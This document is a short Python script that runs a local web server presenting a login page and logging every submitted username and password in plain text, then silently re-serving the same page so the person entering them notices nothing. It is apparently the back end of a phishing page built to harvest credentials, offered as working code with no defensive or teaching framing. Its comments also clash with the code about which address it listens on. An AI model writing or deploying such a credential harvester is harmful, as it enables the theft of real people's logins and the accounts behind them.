from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            with open("index.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404, "File Not Found")

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode("utf-8")
            form_data = urllib.parse.parse_qs(post_data)

            username = form_data.get("username", [""])[0]
            password = form_data.get("password", [""])[0]

            print(f"[+] Received Login -> Username: {username}, Password: {password}")

            # Keep the login page the same
            with open("index.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Not Found")

if __name__ == "__main__":
    server_address = ("192.168.1.117", 8080)  # listen on all LAN interfaces
    httpd = HTTPServer(server_address, SimpleHandler)
    print("🚀 Server running at http://0.0.0.0:8080")
    httpd.serve_forever()
